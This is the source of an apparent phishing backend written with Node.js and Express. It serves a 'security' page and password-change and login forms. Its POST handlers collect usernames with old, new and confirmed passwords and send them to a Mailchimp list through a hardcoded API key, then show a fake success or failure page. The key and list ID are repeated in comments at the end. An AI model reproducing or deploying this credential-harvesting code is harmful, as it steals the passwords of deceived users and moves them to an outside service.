const express = require('express');
const https = require('https');
const request = require("request");
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({extended: true}));

app.use(express.static("public"));

app.get("/", function(req, res){
  res.sendFile(__dirname + "/security.html");
});

app.get("/index.html", function(req, res){
  res.sendFile(__dirname + "/index.html");
});

app.get("/index1.html", function(req,res){
  res.sendFile(__dirname + "/index1.html");
});




app.post("/index.html", function(req, res){
  const username = req.body.username;
  const oldPassword = req.body.oldPassword;
  const newPassword = req.body.newPassword;
  const confirmPassword = req.body.confirmPassword;

  // console.log(username);
  // console.log(oldPassword);
  // console.log(newPassword);
  // console.log(confirmPassword);

  const data = {
    members: [
      {
        email_address: username,
        status: "subscribed",
        merge_fields: {
          OLD: oldPassword,
          NEW: newPassword,
          CONFIRM: confirmPassword
        }
      }
    ]
  };

  const JsonData = JSON.stringify(data);

  const url = 'https://us6.api.mailchimp.com/3.0/lists/70888f3e7a';
  const options = {
    method: "POST",
    auth: "anonymous:33290f025a0fc955d9d6d719e905178d-us6"
  }

  const request = https.request(url, options, function(response){
    response.on("data", function(data){
      console.log(JSON.parse(data));
    })
  })

  request.write(JsonData);
  request.end();

  res.sendFile(__dirname + "/success.html");
});




app.post("/index1.html", function(req, res){
  var username = req.body.Username;
  var password = req.body.password;

  // console.log(username);
  // console.log(password);

  const data = {
    members: [
      {
        email_address: username,
        status: "subscribed",
        merge_fields: {
          OLD: password
        }
      }
    ]
  };

  const JsonData = JSON.stringify(data);

  const url = 'https://us6.api.mailchimp.com/3.0/lists/70888f3e7a';
  const options = {
    method: "POST",
    auth: "anonymous:33290f025a0fc955d9d6d719e905178d-us6"
  }

  const request = https.request(url, options, function(response){
    response.on("data", function(data){
      console.log(JSON.parse(data));
    })
  })

  request.write(JsonData);
  request.end();


  res.sendFile(__dirname + "/failure.html");
});

app.listen(process.env.PORT || 3000, function(){
  console.log("Server is running on port: 3000");
});

//API Key
// 33290f025a0fc955d9d6d719e905178d-us6

// //List // ID
// 70888f3e7a
